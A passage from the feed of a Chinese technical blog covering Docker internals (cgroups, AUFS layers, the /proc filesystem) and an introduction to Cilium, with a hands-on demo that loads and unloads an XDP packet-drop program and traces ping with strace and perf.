架构)</li><li><code>devices</code>控制<code>cgroup</code>中进程对设备的访问</li><li><code>freezer</code>用于挂起(suspend)和恢复(resume)<code>cgroup</code>中的进程</li><li><code>memory</code>用于控制<code>cgroup</code>中进程的内存占用</li><li><code>net_els</code>用于将<code>cgroup</code>中进程产生的网络包分类，以便<code>Linux</code>的<code>tc(traffic controller)</code>可以根据分类区分出来自某个<code>cgroup</code>的包并做限流或监控</li><li><code>net_prio</code>设置<code>cgroup</code>中进程产生的网络流量的优先级</li><li><code>ns</code>这个<code>subsystem</code>比较特殊，它的作用是使<code>cgroup</code>中的进程在新的<code>Namespace</code>中<code>fork</code>新进程<code>CNEWNS</code>时，创建出一个新的<code>cgroup</code>，这个<code>cgroup</code>包含新的<code>Namespace</code>中的进</li></ul></li></ul><p>每个<code>subsystem</code>会关联到定义了相应限制的<code>cgroup</code>上，并对这个<code>cgroup</code>中的进程做相应的限制和控制。</p><ul><li><code>hierarchy</code>的功能是把一组<code>cgroup</code>串成一个树状的结构，一个这样的树便是一个 <code>hierarchy</code>，通过这种树状结构，<code>Cgroups</code>可以做到继承。比如，系统对一组定时的任务进程通过<code>cgroup1</code>限制了CPU的使用率，然后其中有一个定时<code>dump</code>日志的进程还需要限制磁盘 IO，为了避免限制了磁盘IO之后影响到其他进程，就可以创建<code>cgroup2</code>，使其继承于 <code>cgroup1</code>并限制磁盘的IO，这样<code>cgroup2</code>便继承了<code>cgroup1</code>中对<code>CPU</code>使用率的限制，并且增加了磁盘IO的限制而不影响到<code>cgroup1</code>中的其他进程</li></ul><h5 id="三个组件之间的关系"><a href="#三个组件之间的关系" class="headerlink" title="三个组件之间的关系"></a>三个组件之间的关系</h5><ul><li>系统在创建了新的<code>hierarchy</code>之后，系统中所有的进程都会加入这个<code>hierarchy</code>的<code>cgroup</code>根节点，这个<code>cgroup</code>根节点是<code>hierarchy</code>默认创建的</li><li>一个<code>subsystem</code>只能附加到一个<code>hierarchy</code>上面</li><li>一个<code>hierarchy</code>可以附加多个<code>subsystem</code></li><li>一个进程可以作为多个<code>cgroup</code>的成员，但是这些<code>cgroup</code>必须在不同的<code>hierarchy</code>中</li><li>一个进程<code>fork</code>出子进程时，子进程是和父进程在同一个<code>cgroup</code>中的，也可以根据需要将其移动到其他<code>cgroup</code>中</li></ul><h5 id="Docker是如何使用Cgroups的"><a href="#Docker是如何使用Cgroups的" class="headerlink" title="Docker是如何使用Cgroups的"></a>Docker是如何使用Cgroups的</h5><p>设置内存限制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -m 128m ubuntu</span><br></pre></td></tr></table></figure><p>docker会为每个容器在系统的<code>hierarchy</code>种创建<code>cgroup</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /sys/fs/cgroup/memory/docker/&lt;container_id&gt;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat memory.limit_in_bytes #查看cgroup的内存限制</span><br><span class="line">cat memory.usage_in_bytes #查看cgroup中进程所使用的内存大小</span><br></pre></td></tr></table></figure><p>可以看到，Docker通过为每个容器创建<code>cgroup</code>，并通过<code>cgroup</code>去配置资源限制和资源监控</p><h4 id="Union-File-System"><a href="#Union-File-System" class="headerlink" title="Union File System"></a>Union File System</h4><h5 id="concept-2"><a href="#concept-2" class="headerlink" title="concept"></a>concept</h5><p><code>Union File System</code>简称<code>UnionFS</code>，是一种位<code>Linux</code>、<code>FreeBSD</code>和<code>NetBSD</code>操作系统设计的，把其他文件系统联合到一个联合挂载点的文件系统服务。它使用<code>branch</code>把不同文件系统的文件和目录”透明地”覆盖，形成一个单一一致的文件系统。这些<code>branch</code>或者是<code>read-only</code>的，或者是<code>read-write</code>的，所以当对这个虚拟后的联合文件系统进行写操作的时候，系统是真正写到了一个新的文件中。看起来这个虚拟后的联合文件系统是可以对任何文件进行操作的，但是其实它并没有改变原来的文件，这是因为<code>unionfs</code>用到了一个重要的资源管理技术，叫写时复制。</p><p>写时复制(copy-on-write，简称CoW)，也叫隐式共享，是一种对可修改资源实现高效复制的资源管理技术。它的思想是，如果一个资源是重复的，但没有任何修改，这时并不需要立即创建一个新的资源，这个资源可以被新旧实例共享。创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改时增加小部分的开销</p><h5 id="AUFS"><a href="#AUFS" class="headerlink" title="AUFS"></a>AUFS</h5><p><code>AUFS</code>，英文全称是<code>Advanced Multi-Layered Unification Filesystem</code>，曾经也叫<code>Acronym Multi-Layered Unification Filesystem</code>、<code>Another Multi-Layered Unification Filesystem</code>。 <code>AUFS</code>完全重写了早期的<code>UnionFS 1.x</code>，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。<code>AUFS</code>的一些实现已经被纳入<code>UnionFS 2.x</code>版本</p><h5 id="Docker是如何使用AUFS的"><a href="#Docker是如何使用AUFS的" class="headerlink" title="Docker是如何使用AUFS的"></a>Docker是如何使用AUFS的</h5><p><code>AUFS</code>是Docker选用的第一种存储驱动。<code>AUFS</code>具有快速启动容器、高效利用存储和内存的优点。直到现在，<code>AUFS</code>仍然是Docker支持的一种存储驱动类型。</p><h6 id="Image-layer和AUFS"><a href="#Image-layer和AUFS" class="headerlink" title="Image layer和AUFS"></a>Image layer和AUFS</h6><p>每一个<code>Docker image</code>都是由一系列<code>read-only layer</code>组成的，<code>image layer</code>的内容都存储在<code>Docker hosts filesystem</code>的<code>/var/lib/docker/aufs/diff</code>目录下。而<code>/var/lib/docker/aufs/layers</code>目录，则存储着<code>image layer</code>如何堆栈这些<code>layer</code>的<code>metadata</code></p><h6 id="Container-layer和AUFS"><a href="#Container-layer和AUFS" class="headerlink" title="Container layer和AUFS"></a>Container layer和AUFS</h6><p>Docker使用<code>AUFS</code>的<code>CoW</code>技术来实现<code>image layer</code>共享和减少磁盘空间占用。<code>CoW</code>意味着一旦某个文件只有很小的部分有改动， <code>AUFS</code>也需要复制整个文件。这种设计会对容器性能产生一定的影响，尤其是在待复制的文件很大，或者位于很多<code>image layer</code>下方，又或者<code>AUFS</code>需要深度搜索目录结构树的时候。不过也不用过度担心，对于一个容器而言，每个<code>image layer</code>最多只需要复制一次。后续的改动都会在第一次拷贝的<code>container layer</code>上进行。</p><p>启动一个<code>container</code>的时候，Docker会为其创建一个<code>read-only</code>的<code>init layer</code>，用来存储与这个容器内环境相关的内容，Docker还会为其创建一个<code>read-write</code>的<code>layer</code>来执行所有写操作。</p><p><code>container layer</code>的<code>mount</code>目录也是<code>/var/lib/docker/aufs/mnt</code>。<code>container</code>的<code>metadata</code>和配置文件都存放在<code>/var/lib/docker/containers/&lt;container-id&gt;</code>目录中。<code>container</code>的<code>read-write layer</code>存储在<code>/var/lib/docker/aufs/diff/</code>目录下。即使容器停止，这个可读写层仍然存在，因而重启容器不会丢失数据，只有当一个容器被删除的时候，这个可读写层才会一起删除。</p><p>最后，讲一下<code>AUFS</code>如何为<code>container</code>删除一个文件。如果要删除file1时，<code>AUFS</code>会在<code>container</code> 的<code>read-write</code>层生成一个<code>.wh.file1</code>的文件来隐藏所有<code>read-only</code>层的file1文件。</p><h4 id="Linux-proc介绍"><a href="#Linux-proc介绍" class="headerlink" title="Linux proc介绍"></a>Linux proc介绍</h4><p>Linux下的<code>/proc</code>文件系统是由内核提供的，它其实不是一个真正的文件系统，只包含了系统运行时的信息(比如系统内存、mount设备信息、一些硬件配置等)，只存在于内存中，而不占用外存空间。它以文件系统的形式，为访问内核数据的操作提供接口。</p><p>当遍历<code>/proc</code>目录时，会发现很多数字，这些都是为每个进程创建的空间。</p><p>一些具体的文件信息如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/proc/N PID为N的进程信息</span><br><span class="line">/proc/N/cmdline 进程启动命令</span><br><span class="line">/proc/N/cwd链接到进程当前工作目录</span><br><span class="line">/proc/N/environ 进程环境变量列表</span><br><span class="line">/proc/N/exe 链接到进程的执行命令文件</span><br><span class="line">/proc/N/fd 包含进程相关的所有文件描述符</span><br><span class="line">/proc/N/maps 与进程相关的内存映射信息</span><br><span class="line">/proc/N/mem 指代进程持有的内存，不可读</span><br><span class="line">/proc/N/root 链接到进程的根目录</span><br><span class="line">/proc/N/stat 进程的状态</span><br><span class="line">/proc/N/statm 进程使用的内存状态</span><br><span class="line">/proc/N/status 进程状态信息，比stat/statm更具可读性</span><br><span class="line">/proc/self/链接到当前正在运行的进程</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Namespace&quot;&gt;&lt;a href=&quot;#Namespace&quot; class=&quot;headerlink&quot; title=&quot;Namespace&quot;&gt;&lt;/a&gt;Namespace&lt;/h4&gt;&lt;h5 id=&quot;concept&quot;&gt;&lt;a href=&quot;#concept&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>略知一二之Cilium</title>
    <link href="elssm.github.io/2022/03/18/%E7%95%A5%E7%9F%A5%E4%B8%80%E4%BA%8C%E4%B9%8BCilium/"/>
    <id>elssm.github.io/2022/03/18/略知一二之Cilium/</id>
    <published>2022-03-18T10:06:24.000Z</published>
    <updated>2022-03-18T10:13:18.021Z</updated>
    
    <content type="html"><![CDATA[<h4 id="What-is-Cilium？"><a href="#What-is-Cilium？" class="headerlink" title="What is Cilium？"></a>What is Cilium？</h4><p>Cilium is open source software for transparently securing the network connectivity between application services deployed using Linux container management platforms like Docker and Kubernetes.</p><p>At the foundation of Cilium is a new Linux kernel technology called BPF, which enables the dynamic insertion of powerful security visibility and control logic within Linux itself. Because BPF runs inside the Linux kernel, Cilium security policies can be applied and updated without any changes to the application code or container configuration.</p><h4 id="Why-Cilium？"><a href="#Why-Cilium？" class="headerlink" title="Why Cilium？"></a>Why Cilium？</h4><p><img src="/2022/03/18/略知一二之Cilium/1.png" alt="1"></p><h4 id="eBPF-Architecture"><a href="#eBPF-Architecture" class="headerlink" title="eBPF Architecture"></a>eBPF Architecture</h4><p><img src="/2022/03/18/略知一二之Cilium/2.png" alt="2"></p><h4 id="XDP"><a href="#XDP" class="headerlink" title="XDP"></a>XDP</h4><p>Cilium方案中大量使用了XDP、TC等网络相关的BPF hook，以实现高性能的网络RX和TX。</p><p>XDP全称为<strong>eXpress Data Path</strong>，是Linux内核网络栈的最底层。它只存在于RX路径上，允许在网络设备驱动内部网络堆栈中数据来源最早的地方进行数据包处理，在特定模式下可以在操作系统分配内存（<strong>skb</strong>）之前就已经完成处理。</p><p>尝试写一个xdp代码，名为<code>xdp-example.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __section</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __section(NAME) \</span></span><br><span class="line">   __attribute__((section(NAME),used))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"prog"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xdp_drop</span><span class="params">(struct xdp_md *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> __license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>查看整个编译过程都做了哪些事情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# clang -ccc-print-phases -o2 -Wall -target bpf -c xdp-example.c -o xdp-example.o</span><br><span class="line">         +- 0: input, "xdp-example.c", c//输入</span><br><span class="line">      +- 1: preprocessor, &#123;0&#125;, cpp-output//预处理</span><br><span class="line">   +- 2: compiler, &#123;1&#125;, ir//编译</span><br><span class="line">+- 3: backend, &#123;2&#125;, assembler//汇编</span><br><span class="line">4: assembler, &#123;3&#125;, object//生成目标代码</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# file xdp-example.o</span><br><span class="line">xdp-example.o: ELF 64-bit LSB relocatable, eBPF, version 1 (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>加载xdp程序</p><p>首先查看主机的网卡设备列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:82:8b:d7 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    inet 192.168.19.84/16 brd 192.168.255.255 scope global ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fe82:8bd7/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>加载程序之前ping虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ping 192.168.19.84</span><br><span class="line">PING 192.168.19.84 (192.168.19.84): 56 data bytes</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=0 ttl=60 time=98.922 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=1 ttl=60 time=104.328 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=2 ttl=60 time=101.547 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=3 ttl=60 time=107.351 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=4 ttl=60 time=62.270 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=5 ttl=60 time=84.121 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.19.84 ping statistics ---</span><br><span class="line">6 packets transmitted, 6 packets received, 0.0% packet loss</span><br><span class="line">round-trip min/avg/max/stddev = 62.270/93.090/107.351/15.629 ms</span><br></pre></td></tr></table></figure><p>加载xdp程序到网卡设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip link set dev ens160 xdp obj xdp-example.o</span><br></pre></td></tr></table></figure><p>检查是否已经挂载到<code>ens160</code>网卡</p><p><img src="/2022/03/18/略知一二之Cilium/3.png" alt="3"></p><p>加载程序之后ping虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ping 192.168.19.84                    </span><br><span class="line">PING 192.168.19.84 (192.168.19.84): 56 data bytes</span><br><span class="line">Request timeout for icmp_seq 0</span><br><span class="line">Request timeout for icmp_seq 1</span><br><span class="line">Request timeout for icmp_seq 2</span><br><span class="line">Request timeout for icmp_seq 3</span><br><span class="line">^C</span><br><span class="line">--- 192.168.19.84 ping statistics ---</span><br><span class="line">5 packets transmitted, 0 packets received, 100.0% packet loss</span><br></pre></td></tr></table></figure><p>卸载xdp程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip link set dev ens160 xdp off</span><br></pre></td></tr></table></figure><h4 id="内核跟踪"><a href="#内核跟踪" class="headerlink" title="内核跟踪"></a>内核跟踪</h4><p><img src="/2022/03/18/略知一二之Cilium/4.png" alt="4"></p><h5 id="动态追踪历史"><a href="#动态追踪历史" class="headerlink" title="动态追踪历史"></a>动态追踪历史</h5><p>严格来讲 Linux 中的动态追踪技术其实是一种高级的调试技术, 可以在内核态和用户态进行深入的分析, 方便开发者或系统管理者便捷快速的定位和处理问题</p><p>如下表所示, 为 Linux 追踪技术的大致发展历程</p><div class="table-container"><table><thead><tr><th style="text-align:center">年份</th><th style="text-align:center">技术</th></tr></thead><tbody><tr><td style="text-align:center">2004</td><td style="text-align:center">kprobes/kretprobes</td></tr><tr><td style="text-align:center">2005</td><td style="text-align:center">systemtap</td></tr><tr><td style="text-align:center">2008</td><td style="text-align:center">ftrace</td></tr><tr><td style="text-align:center">2009</td><td style="text-align:center">perf_events</td></tr><tr><td style="text-align:center">2009</td><td style="text-align:center">tracepoints</td></tr><tr><td style="text-align:center">2012</td><td style="text-align:center">uprobes</td></tr><tr><td style="text-align:center">2015</td><td style="text-align:center">eBPF</td></tr></tbody></table></div><h5 id="tracepoint"><a href="#tracepoint" class="headerlink" title="tracepoint"></a>tracepoint</h5><p>tracepoints是散落在内核源码中的一些hook，它们可以在特定的代码被执行到时触发，这一特定可以被各种trace/debug工具所使用。</p><p>perf将tracepoint产生的时间记录下来，生成报告，通过分析这些报告，条有人缘便可以了解程序运行期间内核的各种细节，对性能症状做出准确的诊断。</p><p>安装perf工具</p><p>首先下载内核对应的源码包：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br><span class="line">root@ubuntu:~# cd linux-5.8/tools/perf/</span><br><span class="line">root@ubuntu:~# make</span><br><span class="line">root@ubuntu:~# sudo make install</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf list tracepoint</span><br><span class="line"></span><br><span class="line">List of pre-defined events (to be used in -e):</span><br><span class="line"></span><br><span class="line">  alarmtimer:alarmtimer_cancel                       [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_fired                        [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_start                        [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_suspend                      [Tracepoint event]</span><br><span class="line">  block:block_bio_backmerge                          [Tracepoint event]</span><br><span class="line">  block:block_bio_bounce                             [Tracepoint event]</span><br><span class="line">  block:block_bio_complete                           [Tracepoint event]</span><br><span class="line">  block:block_bio_frontmerge                         [Tracepoint event]</span><br><span class="line">  block:block_bio_queue                              [Tracepoint event]</span><br><span class="line">  block:block_bio_remap                              [Tracepoint event]</span><br><span class="line">  block:block_dirty_buffer                           [Tracepoint event]</span><br><span class="line">  block:block_getrq                                  [Tracepoint event]</span><br><span class="line">  block:block_plug                                   [Tracepoint event]</span><br><span class="line">  block:block_rq_complete                            [Tracepoint event]</span><br><span class="line">  block:block_rq_insert                              [Tracepoint event]</span><br><span class="line">  block:block_rq_issue                               [Tracepoint event]</span><br><span class="line">  block:block_rq_remap                               [Tracepoint event]</span><br><span class="line">  block:block_rq_requeue                             [Tracepoint event]</span><br><span class="line">  block:block_sleeprq                                [Tracepoint event]</span><br><span class="line">  block:block_split                                  [Tracepoint event]</span><br><span class="line">  block:block_touch_buffer                           [Tracepoint event]</span><br><span class="line">  block:block_unplug                                 [Tracepoint event]</span><br></pre></td></tr></table></figure><p>用户空间下，ping命令的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# strace -fF -e trace=network ping 114.114.114.114 -c 1</span><br><span class="line">strace: deprecated option -F ignored</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3</span><br><span class="line">socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5</span><br><span class="line">connect(5, &#123;sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("114.114.114.114")&#125;, 16) = 0</span><br><span class="line">getsockname(5, &#123;sa_family=AF_INET, sin_port=htons(51536), sin_addr=inet_addr("192.168.19.84")&#125;, [16]) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RECVERR, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RECVTTL, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RETOPTS, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_SNDBUF, [324], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_RCVBUF, [65536], 4) = 0</span><br><span class="line">getsockopt(3, SOL_SOCKET, SO_RCVBUF, [131072], [4]) = 0</span><br><span class="line">PING 114.114.114.114 (114.114.114.114) 56(84) bytes of data.</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_TIMESTAMP, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_SNDTIMEO, "\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_RCVTIMEO, "\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) = 0</span><br><span class="line">sendto(3, "\10\0\177\7\0\0\0\1\345\0053b\0\0\0\0\227\274\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., 64, 0, &#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("114.114.114.114")&#125;, 16) = 64</span><br><span class="line">recvmsg(3, &#123;msg_name=&#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("114.114.114.114")&#125;, msg_namelen=128-&gt;16, msg_iov=[&#123;iov_base="\0\0\207\3\0\4\0\1\345\0053b\0\0\0\0\227\274\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., iov_len=192&#125;], msg_iovlen=1, msg_control=[&#123;cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SCM_TIMESTAMP, cmsg_data=&#123;tv_sec=1647511013, tv_usec=720786&#125;&#125;, &#123;cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[66]&#125;], msg_controllen=56, msg_flags=0&#125;, 0) = 64</span><br><span class="line">64 bytes from 114.114.114.114: icmp_seq=1 ttl=66 time=17.1 ms</span><br><span class="line"></span><br><span class="line">--- 114.114.114.114 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 17.147/17.147/17.147/0.000 ms</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>内核空间下，ping命令的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf trace --event 'net:*' ping 114.114.114.114 -c 1 &gt; /dev/null </span><br><span class="line">     0.000 ping/3954500 net:net_dev_queue(skbaddr: 0xffff9204a4a42600, len: 98, name: "ens160")</span><br><span class="line">     0.044 ping/3954500 net:net_dev_start_xmit(name: "ens160", queue_mapping: 3, skbaddr: 0xffff9204a4a42600, protocol: 2048, len: 98, network_offset: 14, transport_offset_valid: 1, transport_offset: 34)</span><br><span class="line">     0.087 ping/3954500 net:net_dev_xmit(skbaddr: 0xffff9204a4a42600, len: 98, name: "ens160")</span><br></pre></td></tr></table></figure><p>除此之外，还可以通过perf查看系统调用函数使用cpu的情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf top</span><br><span class="line">   PerfTop:   16433 irqs/sec  kernel:66.4%  exact:  0.0% lost: 0/0 drop: 0/0 [4000Hz cpu-clock:pppH],  (all, 4 CPUs)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">     9.79%  [kernel]          [k] finish_task_switch</span><br><span class="line">     4.87%  [kernel]          [k] __lock_text_start</span><br><span class="line">     1.81%  [kernel]          [k] do_syscall_64</span><br><span class="line">     1.25%  [kernel]          [k] do_user_addr_fault</span><br><span class="line">     1.13%  [kernel]          [k] clear_page_orig</span><br><span class="line">     0.80%  [kernel]          [k] __softirqentry_text_start</span><br><span class="line">     0.72%  [kernel]          [k] exit_to_usermode_loop</span><br><span class="line">     0.51%  perf              [.] dso__find_symbol</span><br><span class="line">     0.48%  [kernel]          [k] rmqueue_pcplist.constprop.0</span><br><span class="line">     0.45%  [kernel]          [k] strchr</span><br><span class="line">     0.44%  perf              [.] hists__findnew_entry</span><br><span class="line">     0.42%  [kernel]          [k] copy_page_regs</span><br><span class="line">     0.40%  perf              [.] hist_entry__sort</span><br><span class="line">     0.39%  [kernel]          [k] memset_orig</span><br><span class="line">     0.38%  [kernel]          [k] string_escape_mem</span><br><span class="line">     0.36%  perf              [.] __symbols__insert</span><br><span class="line">     0.35%  perf              [.] rb_next</span><br><span class="line">     0.34%  [kernel]          [k] zap_pte_range</span><br><span class="line">     0.33%  perf              [.] sort__dso_cmp</span><br><span class="line">     0.33%  [kernel]          [k] 